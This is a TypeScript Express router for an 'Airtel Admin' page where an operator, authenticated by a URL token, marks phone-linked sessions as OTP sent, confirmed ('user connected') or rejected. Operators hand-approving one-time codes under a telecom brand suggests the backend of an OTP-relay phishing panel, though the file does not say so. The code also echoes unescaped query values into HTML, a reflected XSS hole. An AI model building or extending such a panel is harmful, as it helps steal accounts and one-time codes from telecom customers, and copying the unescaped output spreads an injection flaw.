import { Router, type IRouter } from "express";
import { eq } from "drizzle-orm";
import { db, sessionsTable } from "@workspace/db";

const router: IRouter = Router();

const ADMIN_TOKEN = process.env.ADMIN_TOKEN ?? "";

type SessionStatus = typeof sessionsTable.$inferInsert["status"];

const ACTION_MAP: Record<string, SessionStatus> = {
  otp_sent: "otp_sent",
  confirm: "verified",
  reject: "rejected",
};

const ACTION_LABEL: Record<string, string> = {
  otp_sent: "📤 OTP marqué comme envoyé",
  confirm: "✅ OTP confirmé — utilisateur connecté !",
  reject: "❌ OTP rejeté",
};

const htmlPage = (icon: string, message: string, sub: string) => `
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Airtel Admin</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:system-ui,sans-serif;background:#f0f4ff;display:flex;
         align-items:center;justify-content:center;min-height:100vh}
    .card{background:#fff;border-radius:20px;padding:40px 48px;text-align:center;
          box-shadow:0 6px 32px rgba(0,0,0,.10);max-width:360px;width:90%}
    .icon{font-size:3rem;margin-bottom:16px}
    h1{font-size:1.3rem;font-weight:700;color:#111;margin-bottom:8px}
    p{color:#555;font-size:.95rem;margin-bottom:16px}
    small{color:#aaa;font-size:.78rem}
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">${icon}</div>
    <h1>${message}</h1>
    <p>${sub}</p>
    <small>Vous pouvez fermer cet onglet.</small>
  </div>
</body>
</html>`;

// GET /api/admin/action?sid=...&action=...&token=...
router.get("/admin/action", async (req, res): Promise<void> => {
  const { sid, action, token } = req.query as Record<string, string>;

  if (!ADMIN_TOKEN || token !== ADMIN_TOKEN) {
    res.status(403).send(htmlPage("🔒", "Accès refusé", "Token invalide."));
    return;
  }

  const newStatus = ACTION_MAP[action ?? ""];
  if (!newStatus) {
    res
      .status(400)
      .send(htmlPage("❓", "Action invalide", `Action inconnue : ${action}`));
    return;
  }

  try {
    const [session] = await db
      .select()
      .from(sessionsTable)
      .where(eq(sessionsTable.id, sid ?? ""));

    if (!session) {
      res
        .status(404)
        .send(htmlPage("❌", "Session introuvable", `ID : ${sid}`));
      return;
    }

    await db
      .update(sessionsTable)
      .set({ status: newStatus })
      .where(eq(sessionsTable.id, sid));

    const label = ACTION_LABEL[action] ?? "✅ Fait";
    res.send(htmlPage("✅", label, `📱 ${session.phone}`));
  } catch (err) {
    req.log.error({ err }, "admin/action DB error");
    res
      .status(500)
      .send(htmlPage("⚠️", "Erreur serveur", "Réessayez dans un instant."));
  }
});

export default router;
